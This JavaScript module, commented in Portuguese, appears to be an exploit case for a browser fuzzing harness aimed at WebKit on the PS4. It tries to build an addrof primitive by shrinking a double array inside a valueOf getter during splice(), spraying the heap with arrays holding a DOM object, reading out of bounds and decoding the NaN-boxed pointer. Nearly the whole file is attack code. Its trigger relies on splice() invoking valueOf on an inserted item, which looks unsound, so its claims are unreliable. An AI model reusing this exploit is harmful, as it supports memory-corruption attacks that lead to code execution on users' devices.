export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva addrof (Address Of) via corrupção do Array Butterfly. O método splice() ' +
        'é enganado por um getter que encolhe o array e aloca objetos vizinhos síncronamente. ' +
        'A leitura OOB subsequente força o motor a ler o ponteiro do objeto alvo como um Float64.',

    setup: function() {
        this.results = {};
        
        // 1. O nosso array de "Fast Doubles" (O motor acha que tudo aqui será número)
        this.vulnArray = [1.11, 2.22, 3.33, 4.44];
        
        // 2. A Cobaia: O objeto C++ que queremos descobrir onde mora na RAM
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        const self = this;
        
        
        // 3. A Bomba Relógio
        this.evilObject = {
            valueOf: function() {
                // O GATILHO: Encolhemos o array subjacente para 0
                self.vulnArray.length = 0;
                
                // 🚨 FIX DO HEAP FENG SHUI (Size Class Matching) 🚨
                // O vulnArray original tem tamanho 4.
                // Vamos criar o spray com o tamanho exato de 4, forçando o bmalloc
                // a reciclar o exato bloco de memória que acabamos de libertar!
                self.targetSpray = [];
                
                // Aumentamos a densidade do spray de 200 para 1000 para inundar a Gaveta
                for(let i = 0; i < 1000; i++) {
                    // Preenchemos com a cobaia e "preenchimento" para imitar o tamanho original
                    self.targetSpray.push([self.targetObj, 1.1, 2.2, 3.3]); 
                }
                
                return 9.99; 
            }
        };
    },

    trigger: function() {
        try {
            // Chamamos a função nativa. Ela vai tropeçar no nosso evilObject!
            this.vulnArray.splice(0, 3, this.evilObject);
            this.results.oobArray = this.vulnArray;
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Executado',
        
        // O Extrator addrof
        s => {
            let arr = s.results.oobArray;
            if (arr) {
                // Vamos bisbilhotar fora dos limites do array
                for (let i = 0; i < 15; i++) {
                    let val = arr[i];
                    
                    // Se encontrarmos algo que seja um número, mas que NÃO seja
                    // os valores originais que colocámos lá, apanhámos lixo da RAM vizinha!
                    if (typeof val === 'number' && val !== 9.99 && val !== 1.11 && val !== 2.22 && val !== 3.33 && val !== 4.44 && val !== 0) {
                        
                        // MAGIA DE EXPLOIT: Converter o Float64 de volta para o Endereço de Memória
                        const buf = new ArrayBuffer(8);
                        const f64 = new Float64Array(buf);
                        const u64 = new BigUint64Array(buf);
                        
                        f64[0] = val; // Colocamos o float bizarro
                        const bits = u64[0]; // Lemos como inteiro de 64-bits
                        
                        // O WebKit no PS4 faz o "NaN-Boxing" de ponteiros.
                        // Aplicamos a máscara bitwise para extrair o endereço real:
                        const addr = bits & 0x0000FFFFFFFFFFFFn;
                        
                        // Se o endereço for maior que 1MB (evita falsos positivos de números pequenos)
                        if (addr > 0x100000n) {
                            return `🏆 ADDROF SUCESSO: 0x${addr.toString(16).toUpperCase()}`;
                        }
                    }
                }
            }
            return 0; // Falhou o alinhamento, o fuzzer vai tentar no próximo ciclo.
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.targetSpray = null;
        this.results = {};
    }
};
